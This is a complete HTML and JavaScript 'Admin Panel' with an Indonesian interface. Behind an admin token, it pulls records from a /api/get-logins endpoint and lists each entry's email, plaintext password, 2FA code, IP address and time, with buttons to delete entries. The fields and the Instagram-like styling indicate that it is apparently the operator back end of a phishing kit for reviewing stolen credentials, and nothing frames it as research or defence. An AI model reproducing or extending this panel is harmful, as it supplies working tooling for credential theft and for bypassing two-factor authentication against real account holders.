<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#f5f5f5;padding:20px;color:#333}
.panel{max-width:900px;margin:0 auto}
h1{font-size:22px;margin-bottom:20px}
.login-box{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:350px;margin:80px auto}
.login-box h2{font-size:18px;margin-bottom:15px}
.login-box input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px}
.login-box button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
.login-box button:hover{background:#0081d6}
.login-box .error{color:#e74c3c;font-size:13px;margin-top:8px}
table{width:100%;background:#fff;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.1);border-collapse:collapse;overflow:hidden}
th,td{padding:12px 15px;text-align:left;font-size:13px;word-break:break-all}
th{background:#fafafa;color:#666;font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.5px}
tr:not(:last-child) td{border-bottom:1px solid #eee}
tr:hover td{background:#f8f9ff}
.code{color:#e74c3c;font-weight:600}
.empty{text-align:center;color:#999;padding:40px!important}
.stats{margin-bottom:15px;font-size:13px;color:#666}
.logout{float:right;font-size:13px;color:#0095f6;cursor:pointer;text-decoration:none}
.btn-del{background:#e74c3c;color:#fff;border:none;padding:5px 12px;border-radius:6px;font-size:12px;cursor:pointer}
.btn-del:hover{background:#c0392b}
@media(prefers-color-scheme:dark){
body{background:#0a0a0a;color:#e4e4e4}
.login-box,table,th,td{background:#1a1a1a}
th{background:#222;color:#999}
tr:not(:last-child) td{border-bottom-color:#2a2a2a}
tr:hover td{background:#222}
.login-box input{background:#222;border-color:#333;color:#e4e4e4}
.stats{color:#999}
}
</style>
</head>
<body>
<div class="panel" id="panel">
<h1>Admin Panel <a href="#" class="logout" onclick="logout()">Logout</a></h1>
<div class="stats" id="stats"></div>
<table>
<thead><tr><th>ID</th><th>Email</th><th>Password</th><th>2FA Code</th><th>IP</th><th>Waktu</th><th>Aksi</th></tr></thead>
<tbody id="tbody"></tbody>
</table>
</div>

<div class="login-box" id="loginBox">
<h2>Masukkan Token</h2>
<input type="password" id="tokenInput" placeholder="Token admin" onkeydown="if(event.key==='Enter')loadData()">
<button onclick="loadData()">Masuk</button>
<div class="error" id="error"></div>
</div>

<script>
function getToken(){return localStorage.getItem('panel_token')||''}
function setToken(t){localStorage.setItem('panel_token',t)}
function logout(){localStorage.removeItem('panel_token');location.reload()}

async function loadData(){
var token=document.getElementById('tokenInput').value||getToken();
if(!token){return}
setToken(token);
document.getElementById('error').textContent='';
document.getElementById('loginBox').style.display='none';
document.getElementById('panel').style.display='block';
try{
var r=await fetch('/api/get-logins?token='+encodeURIComponent(token));
var d=await r.json();
if(d.error&&r.status===401){throw new Error('Token salah')}
var tbody=document.getElementById('tbody');
tbody.innerHTML='';
if(!d.data||d.data.length===0){
tbody.innerHTML='<tr><td class="empty" colspan="7">Belum ada data login</td></tr>';
document.getElementById('stats').textContent='Total: 0';
return;
}
document.getElementById('stats').textContent='Total: '+d.data.length;
d.data.forEach(function(row){
var tr=document.createElement('tr');
var time=new Date(row.created_at).toLocaleString('id-ID');
var delBtn=document.createElement('button');
delBtn.className='btn-del';
delBtn.textContent='Hapus';
delBtn.onclick=function(){hapus(row.id)};
var tdAksi=document.createElement('td');
tdAksi.appendChild(delBtn);
    tr.innerHTML='<td>'+row.id+'</td><td>'+esc(row.email)+'</td><td>'+esc(row.password)+'</td><td class="code">'+(row.code||'-')+'</td><td>'+esc(row.ip_address||'-')+'</td><td>'+time+'</td>';
tr.appendChild(tdAksi);
tbody.appendChild(tr)
})
}catch(e){
document.getElementById('loginBox').style.display='block';
document.getElementById('panel').style.display='none';
document.getElementById('error').textContent=e.message;
localStorage.removeItem('panel_token')
}
}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}

async function hapus(id){
if(!confirm('Hapus login ID '+id+'?'))return;
try{
var r=await fetch('/api/delete-login?token='+encodeURIComponent(getToken()),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
var d=await r.json();
if(d.error)throw new Error(d.error);
loadData()
}catch(e){alert('Gagal: '+e.message)}
}

var saved=getToken();
if(saved){
document.getElementById('loginBox').style.display='none';
document.getElementById('panel').style.display='block';
loadData()
}
</script>
</body>
</html>
